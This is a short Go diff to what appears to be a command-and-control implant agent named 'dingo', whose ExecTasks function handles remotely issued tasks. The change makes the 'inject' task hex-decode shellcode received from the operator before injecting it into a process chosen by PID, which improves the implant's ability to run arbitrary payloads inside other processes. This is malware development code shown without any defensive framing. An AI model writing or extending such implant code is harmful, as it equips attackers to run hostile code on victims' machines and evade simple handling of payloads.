@@ -6,6 +6,7 @@ import (
 	"dingo/hg"
 	"dingo/initialization"
 	"dingo/tasks"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"image/png"
@@ -336,7 +337,7 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 			data = fmt.Sprintf("successfully injected into process %s", pid)
 		case "inject":
 			taskDataSplit := strings.Split(taskData, " -- ")
-			shellcode := []byte(taskDataSplit[0])
+			shellcode, _ := hex.DecodeString(taskDataSplit[0])
 			pid := taskDataSplit[1]
 
 			iPid, err := strconv.Atoi(pid)
